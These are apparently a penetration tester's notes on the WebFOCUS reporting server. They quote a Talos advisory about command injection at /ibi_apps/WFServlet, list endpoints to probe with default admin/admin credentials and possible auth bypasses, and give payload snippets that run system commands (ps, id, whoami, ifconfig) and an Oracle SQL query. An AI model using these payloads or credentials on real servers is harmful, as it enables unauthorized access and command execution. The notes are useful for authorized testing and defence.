# WebFOCUS

WebFocus: http://infocenter.informationbuilders.com/wf81rel/index.jsp 
 
## Vulnerabilities
 
From https://www.talosintelligence.com/vulnerability_reports/TALOS-2017-0315:
*Code injection is achieved on the following URL: `/ibi_apps/WFServlet`
By successfully injecting WebFOCUS code on this URL parameter while properly completing the expected syntax, an attacker can leverage the "! " statement of WebFOCUS which allows for system commands to be executed via the reporting module code.*
 
## URLs to test
 
| URL | Result|
|-----|-------|
|/ibi_apps/bid | Access to the main interface - might bypass other auth restrictions|
|/ibi_apps |To test if WebFOCUS is available, default creds of admin/admin|
|/ibi_apps/ibi_html | TOC Report?|
|/ibi_help|Help page|
|/ibi_apps/rs?IBIRS_action=TEST | The RESTful Web Services Test Page |
|/ibi_apps/WFServlet?IBFS1_action=TEST|The RESTful Web Services Test Page|
|/ibi_apps/rs/ibfs?IBRS_action=privileges| Should list available privileges|
|/ibi_apps/rs?IBIRS_action=get&IBIRS_path=/WFC/Repository&IBIRS_service=ibfs|Should list some folders?|
|/ibi_apps/rs/ibfs/WFC/Repository?IBIRS_action=get|Same as above ?|
|/ibi_apps/rs/ibfs/EDA?IBIRS_action=get|This RESTful web service request can be used to list the Reporting Server nodes that are available to WebFOCUS.|
|/ibi_apps/rs/ibfs/EDA/NodeName?IBIRS_action=get|List the applications running on a node (Nodes can be found from the query above this)|
|/ibi_apps/rs/ibfs/EDA/NodeName/AppName?IBIRS_action=get|List the files within an application - relpace NodeName and AppName|
 
 
## Script Notes
 
A minimum script needed. It throws errors but still executes
 
**Command Execution**

```
-SYSTEM ps aux
!ps aux
!id
!whoami
!/sbin/ifconfig -a

-RUN
```	

**SQL**

``` 
- SET &ECHO=ALL

SET SQLENGINE=SQLORA
ENGINE SQLORA

	SELECT user FROM dual

END

-RUN
```

## References
 
Documentation: 
- https://techsupport.informationbuilders.com/public/tc-library.html#collapseOne
- http://documentation.informationbuilders.com
 
REST authentication:
- http://infocenter.informationbuilders.com/wf8104/topic/pubdocs/REST_WebServices/source/topic12.htm
- http://documentation.informationbuilders.com/wf77x.asp
